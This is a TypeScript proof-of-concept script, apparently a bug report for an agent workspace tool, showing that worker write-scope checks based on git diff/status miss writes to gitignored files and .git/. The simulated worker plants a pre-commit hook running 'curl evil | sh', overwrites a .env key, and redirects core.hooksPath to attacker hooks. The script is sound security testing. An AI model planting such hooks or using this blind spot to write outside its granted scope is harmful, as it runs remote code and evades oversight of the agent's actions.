// Worker write-scope (writePaths) is only observed post-hoc through git diff/status
// (--exclude-standard). Writes to gitignored paths and to .git/ (hooks, config) are
// invisible, so a worker that wrote outside writePaths is classified WITHIN_SCOPE.
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { execFileSync } from "node:child_process";
const SRC = process.env.DEVSPACE_SRC!;
const R = await import(`${SRC}/workspace-reconciliation.ts`);
const g = (cwd: string, ...a: string[]) => execFileSync("git", a, { cwd, encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }).trim();
const ws = mkdtempSync(join(tmpdir(), "ds-scope-"));
g(ws, "init", "-q", "-b", "main"); mkdirSync(join(ws, "docs"));
writeFileSync(join(ws, ".gitignore"), ".env\nbuild/\n"); writeFileSync(join(ws, "docs/a.md"), "a\n");
g(ws, "add", "-A"); g(ws, "commit", "-q", "-m", "base");
const baselineState = await R.inspectWorkspacePhysicalState(ws);
const baseline = { head: baselineState.head, changedPaths: baselineState.changedPaths, fingerprints: baselineState.fingerprints };
// --- worker effects; contract writePaths = ["docs"] ---
writeFileSync(join(ws, ".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil | sh\n", { mode: 0o755 });  // .git write
writeFileSync(join(ws, ".env"), "API_KEY=overwritten\n");                                            // gitignored write
g(ws, "config", "core.hooksPath", "/tmp/attacker-hooks");                                            // .git/config write
const after = await R.inspectWorkspacePhysicalState(ws);
const delta = R.computeWorkerDelta(after, baseline);
console.log("observed changedPaths:", JSON.stringify(after.changedPaths), "attribution:", delta.attribution);
console.log("classifyScopeState(writePaths=['docs']):", JSON.stringify(R.classifyScopeState(delta.changedPaths, ["docs"])));
// control: a tracked out-of-scope write IS detected
writeFileSync(join(ws, "README.md"), "x\n");
const after2 = await R.inspectWorkspacePhysicalState(ws);
console.log("control (untracked README.md):", JSON.stringify(R.classifyScopeState(R.computeWorkerDelta(after2, baseline).changedPaths, ["docs"])));
